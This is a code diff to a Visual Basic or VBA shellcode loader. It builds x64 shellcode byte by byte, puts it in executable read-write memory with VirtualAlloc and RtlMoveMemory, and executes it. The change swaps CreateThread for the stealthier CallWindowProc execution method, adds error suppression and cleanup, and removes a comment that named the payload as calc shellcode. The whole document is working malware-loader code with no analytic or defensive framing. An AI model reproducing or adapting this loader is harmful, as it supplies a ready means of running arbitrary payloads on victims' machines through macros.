@@ -3,13 +3,15 @@
 ' Import necessary Windows APIs
 Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, _
     ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function VirtualFree Lib "kernel32" (ByVal lpAddress As Long, _
+    ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
 Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, _
     ByVal Source As String, ByVal Length As Long) As Long
-Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
-    ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
-    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
-Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, _
-    ByVal dwMilliseconds As Long) As Long
+Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" ( _
+    ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, _
+    ByVal Msg As Long, ByVal wParam As Long, _
+    ByVal lParam As Long) As Long
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
 
 ' Global log file handle
 Private Const LogFile As String = "C:\Windows\Temp\execution_log.txt"
@@ -22,9 +24,17 @@ Sub Main()
     InitLogFile
     WriteLog "Execution started"
 
+    ' Memory constants
+    Const MEM_COMMIT As Long = &H1000
+    Const MEM_RELEASE As Long = &H8000&
+    Const PAGE_EXECUTE_READWRITE As Long = &H40
+
+    ' Variable declarations
+    Dim memoryAddress As Long
+    Dim result As Long
+
     ' Define shellcode directly
     Dim binaryStr As String
-    ' calc shellcode
     binaryStr = Chr(&H48) & Chr(&H31) & Chr(&HFF) & Chr(&H48) & Chr(&HF7) & _
              Chr(&HE7) & Chr(&H65) & Chr(&H48) & Chr(&H8B) & Chr(&H58) & _
              Chr(&H60) & Chr(&H48) & Chr(&H8B) & Chr(&H5B) & Chr(&H18) & _
@@ -69,13 +79,8 @@ Sub Main()
 
     WriteLog "Shellcode loaded, length: " & Len(binaryStr) & " bytes"
 
-    ' Memory constants
-    Const MEM_COMMIT As Long = &H1000
-    Const PAGE_EXECUTE_READWRITE As Long = &H40
-
     ' Allocate executable memory
     WriteLog "Allocating memory..."
-    Dim memoryAddress As Long
     memoryAddress = VirtualAlloc(0, Len(binaryStr), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 
     ' Check if memory allocation succeeded
@@ -92,26 +97,43 @@ Sub Main()
     WriteLog "Shellcode copied successfully"
     FlushLog  ' Force flush before execution attempt
 
-    ' Execute shellcode using CreateThread
-    WriteLog "Creating execution thread..."
-    Dim threadID As Long
-    Dim threadHandle As Long
-    threadHandle = CreateThread(0, 0, memoryAddress, 0, 0, threadID)
+    ' Execute shellcode using CallWindowProc
+    WriteLog "Executing shellcode via CallWindowProc..."
+    On Error Resume Next
+    result = CallWindowProc(memoryAddress, 0, 0, 0, 0)
 
-    ' Check if CreateThread succeeded
-    If threadHandle = 0 Then
-        WriteLog "FAILED: Thread creation failed with error: " & Err.LastDLLError
+    If Err.Number <> 0 Then
+        WriteLog "EXECUTION ERROR: " & Err.Description & " (Code: " & Err.Number & ")"
+        If Err.LastDLLError <> 0 Then
+            WriteLog "DLL Error: " & Err.LastDLLError
+        End If
     Else
-        WriteLog "Thread created successfully with ID: " & threadID
+        WriteLog "CallWindowProc returned: " & result
+    End If
+    On Error GoTo ErrorHandler
 
-        ' Wait briefly for execution
-        WriteLog "Waiting for execution to complete..."
-        FlushLog  ' Force flush before waiting
-        WaitForSingleObject threadHandle, 2000  ' Wait only 2 seconds max
-        WriteLog "Wait completed"
+    ' Brief pause to allow any launched processes to initialize
+    WriteLog "Pausing to allow process initialization..."
+    FlushLog
+    Sleep 1000  ' Wait 1 second
+
+    ' Free memory
+    WriteLog "Freeing allocated memory..."
+    If memoryAddress <> 0 Then
+        VirtualFree memoryAddress, 0, MEM_RELEASE
+        memoryAddress = 0
+        WriteLog "Memory released"
     End If
 
+    WriteLog "Process cleanup completed successfully"
+
 Cleanup:
+    ' Ensure all resources are released
+    If memoryAddress <> 0 Then
+        VirtualFree memoryAddress, 0, MEM_RELEASE
+        WriteLog "Memory released in cleanup"
+    End If
+
     WriteLog "Execution sequence completed"
     CloseLogFile
     Exit Sub
